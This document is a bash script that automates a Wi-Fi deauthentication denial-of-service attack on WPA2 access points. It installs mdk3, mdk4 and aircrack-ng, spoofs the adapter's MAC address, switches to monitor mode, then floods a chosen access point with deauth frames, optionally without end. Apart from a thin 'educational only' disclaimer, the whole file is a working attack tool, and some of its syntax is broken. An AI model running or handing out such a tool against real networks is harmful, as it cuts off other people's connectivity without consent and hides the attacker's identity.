#!/bin/bash

#this script is for educational purposes only
#I am not responsible for any damage caused by this script
#this script is for testing your own network or someone else's network with permission

#this script is a DOS attack for WPA2 APS
#by: TDonk994

#last commit date: 10/02/2024



echo "DOS Attack for WPA2 APS, using airodump, airmon, mdk3 and mdk4"
sleep 1
echo "make sure you have sudo privileges"
echo "make sure you have a wireless adapter able to go into monitor mode"
echo "recommend to use in dir desktop"
read -p "Do you want to continue? (y/n): " continue
if [ $continue == "n" ]; then
    echo "exiting"
    exit 1
else
    echo "continuing"
fi
sleep 1
echo "Checking if mdk3, mdk4 and aircrack-ng are installed"
#this variables check if the packages are installed
mdk3Check=$(sudo dpkg -s mdk3 &> /dev/null && echo "true" || echo "false")
mdk4Check=$(sudo dpkg -s mdk4 &> /dev/null && echo "true" || echo "false")
aircrackCheck=$(sudo dpkg -s aircrack-ng &> /dev/null && echo "true" || echo "false")
#this checks if mdk3 is installed
if [ $mdk3Check == "false" ]; then
    echo "mdk3 is not installed"
    read -p "Do you want to install mdk3? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing mdk3"
        sudo apt-get install mdk3
        echo "mdk3 installed"
    else
        echo "mdk3 is required for this attack"
        exit 1
    fi
else
    echo "mdk3 is installed"
fi
#this checks if mdk4 is installed
if [ $mdk4Check == "false" ]; then
    echo "mdk4 is not installed"
    read -p "Do you want to install mdk4? (y/n): " install
    if [ $install == "y" ]
    then
        echo "installing mdk4"
        sudo apt-get install mdk4
        echo "mdk4 installed"
    else
        echo "mdk4 is required for this attack"
        exit 1
    fi
else
    echo "mdk4 is installed"
fi
#this checks if aircrack-ng is installed
if [ $aircrackCheck == "false" ]; then
    echo "aircrack-ng is not installed"
    read -p "Do you want to install aircrack-ng? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing aircrack-ng"
        sudo apt-get install aircrack-ng
        echo "aircrack-ng installed"
    else
        echo "aircrack-ng is required for this attack"
        exit 1
    fi
else
    echo "aircrack-ng is installed"
fi
#user input for a AP's name
read -p "Enter the AP's name: " AP
sleep 1
echo "The AP's name is: $AP"
#setting up the wireless adapter and other stuff that might interfere with the attack
echo "setting up the wireless adapter/interfaces"
sudo ifconfig eth0 down 
sudo iwconfig wlan0 down 
sudo macchanger -r wlan0 
sudo systemctl stop wpa_supplicant
sudo systemctl stop NetworkManager
sudo airmon wlan0 start
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

#asking the user which attack they want to use
read -p "which attack do you want to use? mdk3(1), mdk4(2), aireplay-ng(3)?": " attack"
if [ $attack == "1" ]; then
    echo "starting mdk3 attack"
    sudo mdk3 wlan0 d -w $AP
elif [ $attack == "2" ]; then
    echo "starting mdk4 attack"
    sudo mdk4 wlan0 d -w $AP
elif [ $attack == "3" ]; then
    echo "setting up aireplay-ng deauth attack"
#deletes the files if they exist so no duplicates
#also recommend to use the desktop directory for this
    if [ -e "wlan0-01.csv" ]; then
        rm wlan0-01.csv
    else
        echo "no more wlan0-01.csv"
    fi
    if [ -e "bssid.csv" ]; then
        rm bssid.csv
    else
        echo "no more bssid.csv"
    fi
    if [ -e "bssid1.csv" ]; then
        rm bssid1.csv
    else
        echo "no more bssid1.csv"
    fi
    if [ -e "bssid2.csv" ]; then
        rm bssid2.csv
    else
        echo "no  more bssid2.csv"
    fi
    echo "all files deleted or non existent"
    sleep 1
    echo "starting airodump-ng to find $AP, this will take 15 seconds"
    sudo timeout 15 airodump-ng -b abg -N $AP wlan0 --write wlan0 --output-format csv  
    cat wlan0-01.csv | grep $AP > bssid.csv
    cat bssid.csv | sed 's/,//g' > bssid1.csv
    checknumberofbssids=$(cat bssid1.csv | awk '{print $1}' | wc -l)
    if [ $checknumberofbssids > 1 ]; then
        echo "multiple bssids found"
        cat bssid1.csv | awk '{print}'
        cat bssid1.csv | awk '{print $1}' 
        read -p "which bssid do you want to use? type the whole mac address: " bssid
        echo "you chose $bssid"
        cat bssid1.csv | grep $bssid > bssid2.csv
        usedbssid=$(cat bssid2.csv | awk '{print $1}')
        usedchannel=$(cat bssid2.csv | awk '{print $6}') 
        echo "changing channel to $usedchannel"
        sleep 1
        sudo iwconfig wlan0 channel $usedchannel
        echo "starting aireplay-ng attack" 
        sleep 1
        read -p "how long do you want to run the attack for? (in seconds): " time
        if [ $time == "0" ]; then
            echo "running attack until you stop it"
            sudo aireplay-ng -0 0 -a $usedbssid wlan0
        elif [[ -n ${time//[0-9]/} ]]; then
            echo "invalid input"
            sleep 1 
            echo "running attack until you stop it (ctrl c)"
            sudo aireplay-ng -0 0 -a $usedbssid wlan0

        else
            echo "running attack for $time seconds"
            sudo aireplay-ng -0 $time -a $usedbssid wlan0
            echo "attack finished"
            sleep 1 
            echo "exiting"
            exit 1
        fi
else
    echo "invalid input"
    exit 1
fi
